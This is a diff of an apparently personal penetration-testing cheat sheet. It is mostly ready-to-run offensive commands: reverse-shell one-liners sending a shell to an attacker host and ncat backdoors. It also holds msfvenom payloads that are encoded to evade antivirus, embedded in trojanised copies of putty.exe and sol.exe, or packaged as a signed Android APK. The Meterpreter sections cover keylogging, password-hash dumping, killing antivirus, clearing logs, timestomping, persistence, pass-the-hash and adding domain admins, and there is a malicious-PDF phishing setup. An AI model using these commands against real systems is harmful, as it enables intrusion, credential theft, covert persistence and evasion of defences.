@@ -1,14 +1,22 @@
-Commands
-  dirb https://domain.com # bruto forse open wordlist 
+# Commands
+#------------------------------------------------------------------------------
+  dirb https://domain.com       # bruto forse open wordlist
   dmitry -s -e -w -p domain.com # scan,email,whois,tcp subdomain search
-  fierce -dns $domain -threads 10 # trase domain
+  fierce -dns $domain -threads 10            # trase domain
   firewalk -S 1-23 -i eth0 192.168.1.1 192.168.10.1 # testing routers
-  kismet # wireless network detector
-  masscan 192.168.1.0/24 -p 80,443,23  # scan internet; similar to nmap
+  kismet                                     # wireless network detector
+  masscan 192.168.1.0/24 -p 80,443,23        # scan internet; similar to nmap
   nmap -Pn -sV host.com --script dns-brute   # normal
   nmap -Pn -sA host.com --script dns-brute   # TCP ACK scan
   nmap -Pn -sW host.com --script dns-brute   # Window scan like ACK
   nmap -Pn -sI host.com zombiehost.com domain.com   # normal, idle
+  nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24
+         # scan list with open UDP services
+  nmap --script=http-headers 192.168.1.0/24  # check header
+  nmap --script=http-enum 192.168.1.0/24     # find web app from known paths
+  nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24 # hearthbleed testing
+  nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24 # info
+
   shodan convert mongodbdb.json.gz csv
   shodan convert nging-sample.json.gz xlsx
   shodan count http.compenent:bootstrap
@@ -23,8 +31,7 @@ Commands
   shodan parse --fields ip_str, hacked-sites.json.gz
   shodan parse -f location.country_code:US a.json.gz -O ab.json.gz
   shodan parse ab.json.gz --fields ip_tr,port,hosnames,location.country
-  shodan parse --fields title hacked.json.gz | grep -r "hacked by" | 
-sed -e 's/.*hacked by//i' | sort | uniq -c | sort -klnr -k2d | head -10
+  shodan parse --fields title hacked.json.gz | grep -r "hacked by" | sed -e 's/.*hacked by//i' | sort | uniq -c | sort -klnr -k2d | head -10
   shodan radar
   shodan scan submit --filename scandata 192.20.20.0/24
   shodan stats --facets telnet.option --limit 20 port:23
@@ -39,11 +46,14 @@ sed -e 's/.*hacked by//i' | sort | uniq -c | sort -klnr -k2d | head -10
   shodan search --fields ip_str,port,title 'title:"hacked by"'
   shodan search port:23 telnet.option:com_port_option
   shodan search e7:86:c7:22:b3:08:af:c7:11:fb:a5:ff:9a:ae:38:e4
-  sslscan host.com:port # hunting for flags,misconfiguration
+  sslscan host.com:port           # hunting for flags,misconfiguration
+  sslyze --regular <domain>
+  openssl s_client -connect <domain:port>
   theharvester -d domain/name -l 20 -b all  # b -sources;list
   whatweb hostname.com
 
-Network Bandwitch
+# Network Bandwitch
+#------------------------------------------------------------------------------
   bmon  # similat to nload
   bwm-ng -o curses2 # -bar graphs
   cbm
@@ -64,7 +74,9 @@ Network Bandwitch
   top -d 1.0 -b | grep Cpu
   vnstat -l -i eth0   # runs in background service/daemon
 
-Network Connections
+# Network Connections
+#------------------------------------------------------------------------------
+  netstat -natup
   ss | less  # list all connections
   ss -tux  # ss -A tcp - filter tcp,udp or unix connections
   ss -a -A udp  # all, All tests
@@ -80,7 +92,8 @@ Network Connections
   ss -nt src 127.0.0.1 sport gt :5000
   watch -n 1 "ss -t4 state syn-sent"
 
-Nmap
+# Nmap
+#------------------------------------------------------------------------------
   --send-eth/send-ip  # send using raw ethernet frames or ip packets
   --script "http-*"   # Scripts with wildcard
   --source-port <number>
@@ -91,32 +104,15 @@ Nmap
   --data hex string  # append custom binary data to sent packets
   --initial-rtt-timeout 250ms --max-retries 2 --host-timeout 15m
 
-
-Metasploit Framework
-  msfconsole
-  search exploit_name
-  use exploits/path/to/exploit
-  show options
-  set RHOST <target.ip>
-  set payload windows/meterpreter/reverse_tcp
-  set lhost <our.machine>
-  set lport <our.port>
-  exploit
-
-Metasploit Payload
-  # https://www.offensive-security.com/metasploit-unleashed/msfpayload/
-  msfpayload -l
-  msfpayload windows/shell_bind_tcp 0
-  # changing exit technique listening port;output as C,Perl,Raw
-  msfpayload windows/shell_bind_tcp EXITFUNC=seh LPORT=1234 0 C
-
-Reverse Shells
+# Reverse Shells
+#------------------------------------------------------------------------------
   bash -i >& /dev/tcp/<attackerip>/<port> 0>&1
   nc -e /bin/sh <attackerip> <port>
   php -r '$sock=fsockopen("<attackip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
   rm /tmp/f;mkfifo /tmp/f;cat
 
-Routersploit
+# Routersploit
+#------------------------------------------------------------------------------
   git clone https://github.com/reverse-shell/routersploit
   cd routersploit  && ./rsf.py # it starts "rsf >"
   use exploits/dlink/dcs_930l_auth_rce
@@ -131,7 +127,848 @@ Routersploit
   set target 192.168.1.1
   run
 
-SSH Tunnelling
-  ssh -f -N -L <source>:<port>:<dest>:<port> user@relay # execute from source
-  ssh -f -N -R <source>:<port>:<dest>:<port> user@relay # execute from dest
+
+# Penetration Testing Methodology
+#-------------------------------------------------------------------------------
+Black or White box testing
+vulnerability assessment versus penetration testing
+Open Source Security Testing Mewthodology Manual (OSSTMM)
+Open Web Application Security Project (OWASP  owasp-zap tool )
+Web Application Security Consortium threat Classification (WASC-TC)
+Penetration Testing Execution Standard (PTES)  -> pre engagement, intelligence gathering , threat modeling, vulnerability analysis, exploitation, post-exploitation, reporting
+General Penetration Testing Framework -
+target scopping,info gathering,target discovery,Enumeration target, Vulnerability mapping
+Social engineering, Target exploitation, Privilege excalation, Maintaining access, reporting
+
+# Target Scoping
+#-------------------------------------------------------------------------------
+gathering client requirements;Preparing the test plan;Profiling test boundaries
+Defining business objectives; Project management and scheduling
+
+# Information gathering
+#-------------------------------------------------------------------------------
+DNS, hostnames, IP addresses, techmnologies and cofiguration used
+Public Resources: archive.org;serversniff.net centralops.net;wink.com;tineye.com
+
+dig <domain> any
+dig @ns4.isp.com example.com axfr     # to do DNS zone transfer we must set
+                                      # authoritative DNS server
+dnsenum example.com
+dnsenum -f dns.txt example.com        # bruto force subdomains from a wordlist
+dnsdict6 example.com
+dmitry -iwnse targethost
+	# perform whois
+	# get information from Netcraft.com
+	# search for all the possible subdomains
+	# search possible emails
+dmitry -p targethost -f -b  # simple port scan
+fierce -dns example.com -threads 3    # find all IPs and hostnames of a target
+host -a <domain>
+host -l <domain> ns4.isp.com          # DNS Zone Transfer
+maltego			    # gathers info from the open source resources
+metagoofil -d example.com -l 20 -t doc,pdf -n 5 -f test.html -o test
+	# -o test save to directory test
+	# -l limit
+	# -n 5 download five files
+	# -f test.html save it
+tcptraceroute www.example.com
+tcptrace -i eth0 -d www.example.com
+theharvester -d example.com -l 100 -b google
+	# google, bing, PGP, Linkedln, Shodan, Jigsaw
+theharvester -d example.com -l 100 -b linkedin
+whois <domain>
+
+
+# Target discovery
+#-------------------------------------------------------------------------------
+alive6 -p eth0
+arping -d -i eth0 <ip> -c 2
+fping 192.168.1.1 192.168.1.100
+fping -g 192.168.56.0/24
+ping -c 1 <ip-ip6> -I eth0 -s <packet_size>
+hping3 -1 <ip> -c 1
+	(-0 == --raw-ip; -1 == --icmp; -2 == --udp; -8 --scan; -9 == --listen)
+nbtscan 192.168.1.1.-254                # windows
+nmap -O 192.168.56.102                  # OS Fingerprinting
+nping -c 1 192.168.56.100-102
+passive_discovery6 eth0
+p0f -f /etc/p0f/p07/p07.fp -o p07.log   # OS Fingerprinting
+
+# Enumerating Target
+#-------------------------------------------------------------------------------
+amap -bq 192.168.56.103 22
+nmap 192.168.56.103
+nmap -sU 192.168.56.103 -p 53,161
+nmap -sN -p 22,25 192.168.56.103
+nmap 192.168.56.103 -oX myscan.xml
+	xsltproc myscan.xml -o myscan.xml
+nmap -sV 192.168.56.103 -p 22
+nmap -O 192.168.53.100	        # fingerpring
+nmap -A <ip>			# aggressive -> service detection (-sV); -O ; -sC -> script scanning; --traceroute
+nmap -6 <ip>
+# Nmap scripting engine
+nmap --script http-enum,http-headers,http-methods,http-php-version -p 80 192.168.1.1
+        -f -> fragment packets
+	--mtu  ->  your own packet size
+	-D (decoy)   some of the probes from the spoofed IP address
+	--source-port
+unicornscan -m U -Iv 192.168.56.103:1-65535
+unicornscan -m U -Iv 192.168.56.103/24:1-65535 -r 10000
+tcpdump --nnx tcp and host 192.168.56.102
+zenmap
+# SNMP enumeration
+onesixtyone -d 192.168.56.103
+snmpcheck -t 192.168.56.103
+# VPN Enumeration
+ike-scan -M -A -Pike-hashkey 192.168.0.10
+	# -A -> aggressive mode
+	# -M -> splits the payload decoded across multiple lines
+ike-scan -M --trans=5,2,1,2 --showbackoff 192.168.0.10
+
+# Vulnerability Mapping
+#-------------------------------------------------------------------------------
+# Local vul; Vulnerability taxonomy -> categorizes all the common sets of vuls
+# Open Vulnerability Assestment System OpenVAS- Amap,Nmap,Snmpwalk,Ike-scan,w3af
+
+CAT -h ww.xx.yy.zz -w lists/community -a lists/passwords -i	# cisto auditing tool
+cge.pl 10.200.213.25.						# cisco global exploiter
+
+# Fuzz analysis - negative testing, against unexpected,invalid and random sets of data input
+cd /user/share/bed/          # bruteforce exploit detector
+bed.pl
+bed -s FRP -u ftpuser -v ftpuser -t 192.168.10.0 -p 21 -o 3
+
+JBroFuxx - fuxxy test web applications
+cd /usr/share/zaproxy/lib/jbrofuzz
+java -jar JBroFuzz.jar
+
+#SNMP Walk  -> powerful information-gathering tool
+snmpwalk -v 2c -c public -O T -L f snmwalk.txt 10.20.127.49
+	# -v version -> (v1,v2c,v3)
+	# -L log the data info file
+	# -O  print the output    T human text format
+	# -c   represents the community string
+
+# Web application analysis
+#---------------------------------
+cd /usr/share/dbpwaudit
+dbpwaudit -L        # find which DBs are supported
+dbpwaudit -s 10.2.254.24 -d pokeronline -D MySQL -U \users.txt -P passwords.txt
+
+SQLMap
+cd /usr/share/sqlmap
+sqlmap -u "https://example.com/test.php?artist=2" -p "artist" -f -b --current-db --dbs --users
+sqlmap -u "https://example.com/test.php?artist=2" -p "artist" --tables -D fanart -v 0
+
+SQL Ninja
+# cd /usr/share/doc/sqlninja
+gzip -d sqlninja.conf.example.gz
+cp sqlninja.conf.example.gz /usr.share.sqlninja/sqlninja.conf    | update configuration
+sqlninja -m t   # test
+sqlninja -m f	# fingerprint
+sqlninja -m u 	# upload a netcat backdoor
+
+# Web application assessment
+burpsuite		# online
+Nikto2   		# basic web server security scanner
+nikto2  -h testphp.example.com -p 80 -T 3478b -t 3 -D \ V -o webtest -F htm
+	# -T tuning option    https://cirt.net
+paros
+w3af_console       # feature-rich web application attack and audit framework
+w3af>>> help
+w3af>>> plugins
+w3af/plugins>>> help
+w3af/plugins>>> output config, htmlFile
+w3af/plugins/output/config:htmlFile>>> help
+w3af/plugins/output/config:htmlFile>>> view
+w3af/plugins/output/config:htmlFile>>> set verbose True
+...
+w3af>>>start    # page 227
+
+WafW00f or WebScarab
+
+
+# Social engineering Toolkit (SET)
+#-------------------------------------------------------------------------------
+setoolkit
+set>
+# Targeted phishing attack -> frist create e-mail template with malicious PDF
+
+
+# Target Exploitation
+#-------------------------------------------------------------------------------
+cd /usr/share/exploitdb/
+vim files.csv               # this will list of exploits currently avaiable from Exploit-Db under the
+                            # /usr/share/exploitdb/platform/
+Exploit - to take advantage of a particular vulnerability
+Payload - part of exploit and run the arbitrary commands on the target system
+Auxiliaries - perform scanning, sniffing, wardialing, fingerprinting and security assestment tasks
+Encoders - encoding the payload to go over firewalls, IDS, IPS and other similar malware defenses
+No Operation or No Operation Performed (NOP) - perform nothing  but cover a consistent payload
+
+#MSF console  - all cmds
+# https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
+
+msfconsole
+msf> help
+msf> show -h
+
+# Privilege Excalation
+#-------------------------------------------------------------------------------
+Vertical privilege excalation: lower privilege user is able to access admin
+Horizontal privilege excalation: norm user is able to access other normal users
+
+
+# Maintaining Access
+#-------------------------------------------------------------------------------
+- Operation system backdoor; tunneling tools; Web backdoor
+Cymothoa  - backdoor allowes to inject its shellcode into an existing process,
+	execution in memory
+1. copy the cymothoa binary file to the target machine to generate the backdoor
+ps -aux
+2. we will inject PID 4255, we need to set the port number for the payload using the option -y
+cymothoa -p 4255 -s l -y 4444
+3. Let's try to log in to our backdoor port 4444
+nc -nvv 192.168.56.102 4444
+
+Intersect
+
+
+# Tunnelling
+#------------------------------------------------------------------------------
+dns2tcp   -> encapsulate TCP in DNS,only DNS request is allowed from target
+dns2tcp -F -d 1 -f /etc/dns2tcp.conf  #-F run in foreground, debug level to 1
+iodine
+ncat -l 1337 -e /bin/sh               # normal backdoor
+	# -l listen
+	# -e execute cmd /bin/sh
+ncat 192.168.2.23 1337                 # from machine connect to target
+# Reverse shell
+ncat -l 1337                           # set pen machine to listen on port 1337
+ncat 192.168.2.21 1337 -e /bin/sh      # on target use the following ncat cmd
+ssh -f -N -L <source>:<port>:<dest>:<port> user@relay # execute from source
+ssh -f -N -R <source>:<port>:<dest>:<port> user@relay # execute from dest
+
+proxychains -> any TCP connection made by any given TCP client to go through the proxy or proxy chain (SOCK4, SOCK5, HTTP CONNECT  --> proxy types)
+proxychain telnet example.com
+
+
+#------------------------------------------------------------------------------
+# MSFconsole
+#------------------------------------------------------------------------------
+# Init
+#------------------------------------------------------------------------------
+/etc/init.d/postresql start
+sudo msfdb init
+   # Creating databases 'msf' and 'msf_test'
+   # Creating conf file /usr/share/metasploit-framework/config/database.yml
+msfconsole
+msf > db_status
+    > help connect
+    > workspace -a my-lab1
+    > workspace -a my-lab2
+    > workspace -a my-lab3
+    > workspace
+
+# kali cli
+#------------------------------------------------------------------------------
+armitage                                       # GUI
+nc -lvnp 8443                # create listener
+nmap -sS -Pn  192.198.1.1    # preferred,-sS > stealth TCP scan,-Pn>alive hosts
+nmap -sS -Pn -A 192.168.1.1  # A - advanced service enumeration
+nmap -sV -p- -T4 192.168.1.1
+nmap --script-help "afp-* and discovery"
+nmap --script "http-*"                       # find inside scripting engine
+nmap -sC --script-args 'user=foo,pass=",{}=bar",paths={/admin,/cgi-bin},xmpp-info.server_name=localhost'
+nmap --script smb-os-discovery --script-trace example.com
+nmap --script mycustomscripts,safe example.com      # execute all scripts in my dir
+nslookup set type=mx secmaniac.net
+msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST [IP]; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST [IP]; run"
+msfvenom -h                                    # replace MSFencode
+msfvenom -l payloads
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c #C-formatted
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"      # encode payload while avoiding bad characters
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"      # encode payload, specifying the desired EXITFUNC option
+msfvenom windows/shell_reverse_tcp O           # list optional variables
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe           # rshell embedded in executable
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.10.5 LPORT=443 -f exe -o met_https_reverse.exe       # gen HTTPS meterpeter payload in executable format
+   # http://hackingandsecurity.blogspot.com/2018/10/metasploitable-3-without-metasploit.html
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.253.130 LPORT=8443 -f war > shell.war     # unzip shell.war
+msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
+     # -f format python; b - The list of characters to avoid example; - i iterate 3 times
+msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python -v notBuf
+     # -v - custom variable
+# to add some NOP
+   msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e generic/none -f python    # before
+   msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e generic/none -f python -n 26   # after
+msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python --smallest
+     # --smallest shellcode possible
+# multiple shellcode file to include
+  msfvenom -a x86 --platform windows -p windows/messagebox TEXT="MSFU Example" -f raw > messageBox
+  msfvenom -c messageBox -a x86 --platform windows -p windows/messagebox TEXT="We are evil" -f raw > messageBox2
+  msfvenom -c messageBox2 -a x86 --platform Windows -p windows/shell/bind_tcp -f exe -o cookies.exe
+     # running the cookies.exe execute both message box payloads, as well the bind shell
+msfvenom -a x86 --platform windows -x sol.exe -k -p windows/messagebox lhost=192.168.101.133 -b "\x00" -f exe -o sol_bdoor.exe
+     # !!! -x  or -template specify an existing executable tu use as a template when you creating your payload
+     # -k  or -keep will preserve the template's normal behaviour and have your injected payload run as a separate thread
+proxychains nmap -P0 -sT -p 3389 --open -oN tcp.nmap 192.168.1.155
+proxychains rdesktop 192.168.1.155         # remove connection
+ssh -l benr -D 1080 192.168.253.143 -N -f
+sslscan <domain>                           # SSL review
+whois secmaniac.net
+
+msfvenom -p android/meterpreter/reverse_tcp  LHOST=192.168.0.110 LPORT=4444 R               # payload as raw input
+
+
+# MSFVENOM Basic Syntax
+#-------------------------------------------------------------------------------
+msfvenom [options] <var=value>
+#Payloads list
+msfvenom -l
+msfvenom --list all
+msfvenom --list archs        # architectura, tty, x64, java, x86, c86_64
+msfvenom --list platforms    # android,aple_ios,cisco,firefox,javascript,unix,r
+msfvenom --list payloads
+msfvenom --list encoders     # cmd/powershell_base64 or x86/shikata_ga_nai
+
+#Creating a Payload
+$ msfvenom -p [payload] LHOST=[listeninghost] LPORT=[listeningport]
+# Format Options (Specified with -f) - Executable formats
+msfvenom --list formats
+#asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, vba, vba-exe, vbs, war
+#Transform formats
+
+#bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
+#Generate binary Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL IP> LPORT=<LOCAL PORT> -f elf > shell.elf
+#Generate binary Windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL IP> LPORT=<LOCAL PORT> -f exe -o shell.exe
+#Generate binary MAC
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<LOCAL IP> LPORT=<LOCAL PORT> -f macho > shell.macho
+#Web Payloads
+#Check payload options
+$ msfvenom -p [payload] --payload-options
+#Encoding a Payload
+$ msfvenom -p [payload] -e [encoder] -f [formattype] -i [iteration] <var=value> > outputfile
+#Encoders Example
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.40 LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload.exe
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o payload.exe
+#Example Remove Bad Characters
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -b ‘\x00′ -f exe -o payload.exe
+#Creating a Payload using a template
+msfvenom -p [payload] <var=value> -x [template] -f [formattype] > outputfile
+#Example Creating executable payload using putty.exe as template
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -x putty.exe -f exe > evilputty.exe
+
+# Android msfvenom
+#------------------------------------------------------------------------------
+# https://resources.infosecinstitute.com/lab-hacking-an-android-device-with-msfvenom/#gref
+msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.5 LPORT=4444 R > ~/Desktop/pentest.apk
+# Android devices only install signed .apk files
+# To sign the apk file locally use these commands:
+keytool -genkey -v -keystore my-release-key.Keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
+# First name: Android; organization unit Google Locality: IL Province: NY country code: US
+#jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore APPNAME.apk aliasname
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore ~/Desktop/pentest.apk pentest
+jarsigner -verify -verbose -certs ~/Desktop/pentest.apk
+# install zipalign -> vefifying the .apk
+apt-get install zipalign
+zipalign -v 4 APPNAME.apk NEWAPPNAME.apk
+zipalign -v 4 ~/Desktop/pentest.apk ~/Desktop/android.apk
+# showing apk file
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 10.0.2.5
+set LPORT 4444
+exploit              # run exploit and start to listening to the android
+# transfer file to android or android emulator
+# download from: https://code.google.com/archive/p/android-x86/downloads
+# spam email
+# run and install .apk file
+meterpreter>sysinfo                       # we got meterpreter session
+
+# file format
+#------------------------------------------------------------------------------
+# https://resources.infosecinstitute.com/how-to-attack-windows-10-machine-with-metasploit-on-kali-linux/#gref
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 -platform windows -f exe LHOST=192.168.100.4 LPORT=4444 -o ~/Desktop/something32.exe
+# making the Executable Fuly Endetectable -> Executable FUD
+sudo apt-get install shellter
+shellter    # run in stealth mode - select yes
+            # 1 -> meterpreter_reverse_tcp
+            # LHOST LPORT
+set up listenrer in msfconsole
+
+# file format pdf, msfconsole
+#------------------------------------------------------------------------------
+# https://www.offensive-security.com/metasploit-unleashed/client-side-exploits/
+use exploit/windows/fileformat/adobe_utilprintf
+set FILENAME BestComputers-UpgradeInstructions.pdf
+set PAYLOAD windows/meterpreter/reverse_tcp
+# Test web applcation
+#------------------------------------------------------------------------------
+owasp-zap
+
+# MSFconsole
+#------------------------------------------------------------------------------
+hosts -c address,os_name -S Linux -R
+exploit -j                                     # background job
+exploit -z            # don not interact with the session after exploitation
+info
+resource automation.rc
+save
+set <function>        - set specific value
+setg                  - global
+show targets
+services -c name,info 192.168.1.155
+services -c name,info -S httpd
+services -c info,name -p 80-445
+services -s http -c port 192.168.1.155 -o /tmp/export-services.csv
+set / unset
+show options | exploits | auxiliary | payloads
+show targets
+search <apache>
+sessions -l -v
+session -i 1
+session -u 1    # upgrade a cmd shell to a Meterpreter shell
+session -u 2    # Meterpreter shell
+session -z      # will not interact with session once target has been exploited
+use
+workspace -a my-lab1
+workspace my-lab1                              # choose workspace
+workspace -d my-lab3                           # delete
+
+# Meterpreter - cmds
+#------------------------------------------------------------------------------
+add_user username password -h ip         # add user on remote machine
+add_group_user "Domain Admins" username -h ip   # add a username to the group
+background                # run your current meterpreter shell in the background
+clearev                   # clear the event log on the target machine
+execute -f cmd.exe -i     # execute cmd.exe and interact with it
+execute -f cmd.exe -i -t  # execute cmd.exe with all available tokens
+execute -f cmd.exe -i -H -t  # execute, all tokens and make it hidden process
+getuid
+getprivs                  # get as many privileges as possible on the target
+getsystem                 # attempt to elevate permissions to SYSTEM-level access through multiple attact vectors
+help
+hashdump                  # dump all hashes on the target
+irb
+ls
+list_tokens -u            # available tokens on the target by user
+list_tokens -g            # available tokens of groups
+impersonate_token DOMAIN_NAME\\USERNAME
+keyscan_start             # start sniffing keystrokes on the remote target
+keyscan_dump              # dump the remote keys campured on remote target
+keyscan_stop              # stop sniffing keystrokes on the remote target
+
+steal_token PID           # steal tokens available for a given process and impersonate that token
+drop_token
+migrate PID               # migrate to specific process, use ps
+ps
+rev2self                  # revert back to the original user you used to compromise target
+reg command               # interact, create, delete, query, set
+run script_name
+run event_manager -c      # covering the tracks
+run migrate -f
+run checkvm               # check if compromised system is virtual machine
+run vnc                   # run vnc on target
+run killav                # kill antivirus process
+reboot                    # reboot the target machine
+timestomp                 # Covering my tracks, change file attributes, sucha as creation date (antiforensics measure)
+setdesktop number         # switch to different screen based on who is logged in
+shell                     # drop into an interactive shell with all available tokens
+screenshot
+sysinfo                   # show sysinfo on compromised target
+upload file               # upload file to the target
+download file             # download a file from the target
+use priv                  # load priv extension for extended meter libraries
+use incognito             # load incognito functions (token stealing, impersonation)
+use sniffer               # load the sniffer module
+sniffer_interfaces        # list of available interfaces
+sniffer_dump interfaceID pcapname   # start sniffing on the remote target
+sniffer_start interfaceID packet-buffer  # start sniffing with specific range for package
+sniffer_stats interfaceID                # grab statistical info
+sniffer_stop interfaceID
+
+# Meterpreter Post exploitation commands
+use priv
+getsystem
+ps
+steal_token 1111
+shell
+#on win
+  net user metasploit passw0rd /ADD /DOMAIN
+  net group "Domain Admins" metasploit /ADD /DOMAIN
+use priv
+getsystem
+hashdump
+
+# Capture keystrokes on target machine
+ps
+migrate 1212
+keyscan_start
+keyscan_dump
+keyscan_stop
+
+# use incognito
+use incognito
+list_tokens -u
+use priv
+getsystem
+list_tokens -u
+impersonate_token SOMEUSER\\Administrator
+
+run getcountermeasure
+run getcountermeasure -h      # display help menu
+run getcountermeasure -d -k   # disable win firewall, kill all counter
+
+# Capturing Keystroke
+meterpreter> ps
+   > migrate <process_number_of_explorer.exe>
+   > run post/windows/capture/keylog_recorder   # save into the file
+cat file_with_keylog_recorder.txt
+
+# Dumping Usernames and Passwords
+#    win: Administrator:500:<LM_hash>:<NTLM_hash>:::-> extract user & pass hash
+#    Rainbow Table Attack
+meterpreter> use priv
+   > run post/windows/gather/smart_hashdump
+
+# Pass the Hash > we have only hash we don't have password
+meterpreter> use  auxiliary/admin/smb/psexec_command
+   > set SMBPass <LM_hash>:<NTLM_hash>
+   > exploit
+
+# Privilege escalation
+
+# Token Impersonation
+meterpreter> ps             # number: 380  user:  SNEAK.in\domainadmin
+   > steal_token 380
+   > list_tokens -u
+   > intersonate_token SNEAK.in\domainadmin
+   > add_user <my_user> <pass> -h 192.168.1.155
+   > add_group_user "Domain Admins" <my_user> -h 192.168.1.155
+   > add_group
+
+# Pivoting onto Other Systems
+meterpreter > run get_local_subnets
+   > background
+   > route add 192.168.1.120 255.255.255.0 1
+   > route print
+   > ....
+   > load auto_add_route
+
+# Using Meterpreter Scripts
+meterpreter> run <script_name>
+   > run vnc
+   > run screen_unlock
+   > run post/windows/manage/migrate              # migrating a Process
+   > run killav                                   # killing Antivirus Software
+   > run hashdump                                 # Obtaining System Pass Hashes
+   > run scraper                  # enumerates just about everything from target
+   > run persistence -X -i 50 -p 443 -r 192.168.1.129
+           # running meterpreter after system reboot
+           # -X > at boot time; -i > wait 50 seconds after start
+
+
+# Run exploit    - Resource files - Autommate CMDs inside msfconsole
+#------------------------------------------------------------------------------
+echo use exploit/windows/smb/ms08_067_netapi  > rf.rc
+echo load sourds >> rf.rc
+echo set RHOST [IP] >> rf.rc
+echo set PAYLOAD windows/meterpreter/reverse_tcp   >> rf.rc
+echo set LHOST [IP] >> rf.rc
+echo run >> rf.rc
+# 1.
+./msfconsole -r rf.rc
+# or 2.
+msf > resource name_of_resource_script.rc
+
+# example of resource_file.rc
+  version
+  load sounds           # load plugin
+  use exploit/windows/smb/ms08_067_netapi
+  set RHOST 192.168.10.1
+  set PAYLOAD windows/meterpreter/reverse_tcp
+  set LHOST 192.168.100.1
+  exploit
+msfconsole
+resource resource_file.rc
+
+
+
+# Inporting nmap result into Metasploit
+#------------------------------------------------------------------------------
+nmap -Pn -sS -A -oX Subnet1 192.168.1.0/24  # output into Subnet1.xml
+    > db_import Subnet1.xml
+    > hosts -c address               # give me list of IP address, db_hosts
+
+# Advanced Nmap Scanning: TCP Idle Scan in msf
+   > use auxiliary/scanner/ip/ipidseq
+   > show options
+   > msf auxiliary(ipidseq)> nmap -PN -sI 192.168.1.10 192.168.1.155
+   > services      # db_services
+
+# Port Scanning with Metasploit
+#------------------------------------------------------------------------------
+msf> search portscan
+   > use scanner/portscan/syn
+   > set RHOSTS 192.168.1.155
+   > set THREADS 50
+   > run
+
+   > use scanner/smb/smb_version
+   > use scanner/mssql/mssql_ping
+   > use scanner/ssh/ssh_version
+   > use scanner/ftp/ftp_version
+   > use auxiliary/scanner/ftp/anonymous    # check if ftp allows anon authent
+        > set RHOST, THREADS  > run
+   > use scanner/snmp/snmp_login
+   > use scanner/simple_tcp
+       # Writing a Custom Scanner
+         - mixins are portions of code with predefined functions
+           and calls that are preconfigured for you
+   > use auxiliary/scanner/smb/smb_login
+   > use auxiliary/scanner/vnc/vnc_none_auth
+   > use auxiliary/scanner/x11/open_x11
+
+
+# Vulnerability scanning
+#------------------------------------------------------------------------------
+nc 192.168.1.155 80
+# NeXpose    https://<my_ip>:3780
+#------------------------------------------------------------------------------
+   # run scan and save it
+   > db_import /tmp/nexpose_hosts.xml
+   > hosts -c address,svcs,vulns
+   > vulns
+
+# Runnning NeXpose inside msf
+    > load nexpose
+    > help
+    > nexpose_connect -h
+    > nexpose_connect <user>:<pass>@<host> ok
+    > nexpose_scan 192.169.1.155
+
+# Nessus
+#------------------------------------------------------------------------------
+# within nessus
+    > load nessus
+    > nessus_connect <user>:<pass>@<host> ok
+    > nessus_policy_list
+    > nessus_scan_new 2 my_name_scan 192.168.1.155   #2 for PCI DSS audits
+    > nessus_scan_status
+    > nessus_report_list
+    > nessus_report_get <id>
+    > hosts -c address,svcs,vulns
+
+
+# Autopwning was removed how to add back
+#------------------------------------------------------------------------------
+# https://github.com/hahwul/metasploit-autopwn
+wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
+cd metasploit-autopwn
+cp db_autopwn.rb /usr/share/metasploit-framework/plugins
+# metasploit's autopwn tool automaticly targets and exploits
+msf> load db_autopwn
+   > db_autopwn -p -R great -e -q 192.168.1.155
+   > db_autopwn -e -t -r -x -p
+       # e > all targets; t > all matching modules; r > reverse shell payload
+       # x > select exploit module based on vulnerability p > open ports
+
+
+# Exploiting WINDOWS
+#------------------------------------------------------------------------------
+  # msf console cmds
+  search mssql
+  show auxiliary
+  show exploits
